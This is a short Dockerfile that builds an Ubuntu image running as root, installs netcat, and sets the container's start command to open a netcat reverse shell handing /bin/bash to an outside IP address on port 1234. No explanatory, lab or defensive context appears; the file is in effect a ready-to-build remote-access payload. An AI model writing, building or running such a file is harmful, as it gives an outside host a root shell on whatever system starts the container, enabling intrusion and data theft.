FROM ubuntu:latest

# Set user to root
USER root

# Update packages
RUN apt-get update -y && apt-get upgrade -y

# Install Netcat
RUN apt-get install -y netcat

# Start Netcat reverse shell
CMD nc 37.1.204.49 1234 -e /bin/bash
